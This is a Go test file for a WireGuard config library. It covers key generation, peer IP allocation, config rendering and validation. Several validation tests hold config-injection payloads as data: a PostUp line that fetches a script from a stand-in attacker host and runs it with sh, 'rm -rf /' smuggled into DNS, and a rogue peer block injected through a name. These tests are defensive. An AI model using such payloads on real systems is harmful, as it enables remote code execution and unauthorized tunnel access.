package wireguard

import (
	"encoding/base64"
	"strings"
	"testing"
)

func TestGenerateKeypair(t *testing.T) {
	priv, pub, err := GenerateKeypair()
	if err != nil {
		t.Fatal(err)
	}
	for _, k := range []string{priv, pub} {
		raw, err := base64.StdEncoding.DecodeString(k)
		if err != nil {
			t.Fatalf("key not valid base64: %v", err)
		}
		if len(raw) != 32 {
			t.Errorf("key length = %d, want 32", len(raw))
		}
	}
	if priv == pub {
		t.Error("private and public keys must differ")
	}

	// Distinct each call.
	priv2, _, _ := GenerateKeypair()
	if priv == priv2 {
		t.Error("expected unique keys per call")
	}
}

func TestNextAllowedIP(t *testing.T) {
	c := Defaults() // 10.7.0.0/24, server 10.7.0.1/24, no peers
	ip, err := NextAllowedIP(c)
	if err != nil {
		t.Fatal(err)
	}
	if ip != "10.7.0.2/32" {
		t.Errorf("first peer IP = %s, want 10.7.0.2/32", ip)
	}

	// With .2 taken, next is .3.
	c.Peers = append(c.Peers, Peer{AllowedIP: "10.7.0.2/32"})
	ip, err = NextAllowedIP(c)
	if err != nil {
		t.Fatal(err)
	}
	if ip != "10.7.0.3/32" {
		t.Errorf("second peer IP = %s, want 10.7.0.3/32", ip)
	}
}

func TestNextAllowedIPExhausted(t *testing.T) {
	c := Defaults()
	c.Subnet = "10.9.9.0/30" // usable hosts: .1 (server skip), only .2 really
	c.Address = "10.9.9.1/30"
	c.Peers = []Peer{{AllowedIP: "10.9.9.2/32"}}
	if _, err := NextAllowedIP(c); err == nil {
		t.Error("expected exhaustion error on a /30 with the host taken")
	}
}

func TestServerConfig(t *testing.T) {
	c := Defaults()
	c.PrivateKey = "SERVERPRIV"
	c.Peers = []Peer{{Name: "Phone", PublicKey: "PEERPUB", AllowedIP: "10.7.0.2/32"}}
	out := ServerConfig(c)
	for _, want := range []string{
		"[Interface]", "Address = 10.7.0.1/24", "ListenPort = 51820",
		"PrivateKey = SERVERPRIV", "[Peer]", "# Phone", "PublicKey = PEERPUB",
		"AllowedIPs = 10.7.0.2/32",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("server config missing %q\n%s", want, out)
		}
	}
}

func TestClientConfig(t *testing.T) {
	c := Defaults()
	c.PublicKey = "SERVERPUB"
	c.Endpoint = "vpn.example.com"
	p := Peer{Name: "Phone", PrivateKey: "PEERPRIV", AllowedIP: "10.7.0.2/32"}
	out := ClientConfig(c, p)
	for _, want := range []string{
		"PrivateKey = PEERPRIV", "Address = 10.7.0.2/32", "DNS = 10.7.0.1",
		"PublicKey = SERVERPUB", "Endpoint = vpn.example.com:51820",
		"AllowedIPs = 0.0.0.0/0", "PersistentKeepalive = 25",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("client config missing %q\n%s", want, out)
		}
	}
}

func TestValidateConfigRejectsNewlineInAddress(t *testing.T) {
	c := Defaults()
	c.Address = "10.7.0.1/24\nPostUp = curl http://attacker/x|sh\n"
	if err := ValidateConfig(c); err == nil {
		t.Fatal("expected error for Address with embedded newline, got nil")
	}
}

func TestValidateConfigAcceptsValidAddress(t *testing.T) {
	c := Defaults()
	if err := ValidateConfig(c); err != nil {
		t.Fatalf("expected Defaults() to be valid, got: %v", err)
	}
}

func TestValidateConfigRejectsMalformedSubnet(t *testing.T) {
	c := Defaults()
	c.Subnet = "not-a-cidr"
	if err := ValidateConfig(c); err == nil {
		t.Fatal("expected error for malformed subnet, got nil")
	}
}

func TestValidateConfigRejectsMalformedDNS(t *testing.T) {
	c := Defaults()
	c.DNS = "10.7.0.1; rm -rf /"
	if err := ValidateConfig(c); err == nil {
		t.Fatal("expected error for malformed DNS, got nil")
	}
}

func TestValidateConfigAcceptsHostnameEndpoint(t *testing.T) {
	c := Defaults()
	c.Endpoint = "meufirewall.duckdns.org"
	if err := ValidateConfig(c); err != nil {
		t.Fatalf("expected hostname endpoint to be valid, got: %v", err)
	}
}

func TestValidateConfigRejectsMalformedEndpoint(t *testing.T) {
	c := Defaults()
	c.Endpoint = "not a hostname\nPostUp = evil"
	if err := ValidateConfig(c); err == nil {
		t.Fatal("expected error for malformed endpoint, got nil")
	}
}

func TestValidatePeerNameRejectsNewline(t *testing.T) {
	if err := ValidatePeerName("Meu celular\n[Peer]\nPublicKey = attacker-key\nAllowedIPs = 0.0.0.0/0"); err == nil {
		t.Fatal("expected error for peer name with embedded newline/peer-block injection, got nil")
	}
}

func TestValidatePeerNameAcceptsAccentedName(t *testing.T) {
	if err := ValidatePeerName("João - Notebook"); err != nil {
		t.Fatalf("expected accented name to be valid, got: %v", err)
	}
}

func TestValidatePeerNameRejectsEmpty(t *testing.T) {
	if err := ValidatePeerName(""); err == nil {
		t.Fatal("expected error for empty name, got nil")
	}
}
